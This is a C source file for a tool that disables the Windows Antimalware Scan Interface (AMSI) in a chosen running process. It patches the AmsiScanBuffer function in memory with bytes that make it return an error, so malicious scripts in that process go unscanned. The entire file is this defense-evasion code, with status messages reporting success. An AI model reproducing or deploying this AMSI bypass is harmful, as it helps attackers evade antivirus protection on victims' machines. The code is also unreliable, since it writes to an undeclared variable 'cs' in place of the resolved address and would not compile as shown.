// AMSI Scan Buffer Patching

#include <windows.h>
#include <stdio.h>

int ErrorHandler(const char* message) {

    printf("%s : %d\n", message, GetLastError());

    return 0;
}


int main(int argc, char* argv[]) {

    HMODULE amsi;
    DWORD   opriv, t;
    LPVOID  addr;
    BOOL x;


#if _WIN64 
    char Patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
    char Patch[8] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif

    char* a = argv[1];
    int pid = atoi(a);


    HANDLE Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!Proc) {

        ErrorHandler("Opening Process Failed");
    }



    amsi = LoadLibrary(L"amsi");

    if (!amsi) {
        ErrorHandler("Opening Handle to Amsi Module Failed");
    }

    
        // resolve address of function to patch
        addr = GetProcAddress(amsi, "AmsiScanBuffer");
        if (!addr) {
            ErrorHandler("Failed to find AmsiScanBuffer Address");
        }

        printf("[+] AmsiScanBuffer located at %x\n", cs);
            // make the memory writeable
        x = VirtualProtect(cs, sizeof(Patch), PAGE_EXECUTE_READWRITE, &opriv);
            
        if (!x) {

            ErrorHandler("Failed to change ");
        }

        printf("[+] Changing Memory Protection to ReadWrite\n");
           
               // memcpy if we want to patch in current process                   
              //  memcpy(cs, &Patch, sizeof(Patch));

                // Patch AmsiScanBuffer in remote process.
               x =  WriteProcessMemory(Proc, cs, Patch, sizeof(Patch), nullptr);
                
               if (!x) {

                   ErrorHandler("Failed to Patch AmsiScanBuffer Method");
               }

               printf("[+] Overwriting AmsiScanBuffer Method\n");
               
               // set back to original protection
                VirtualProtect(cs, sizeof(Patch), opriv, &t);
            
                printf("[+] Successfully disabled AMSI in process : %d\n", pid);
    

    return 0;
}
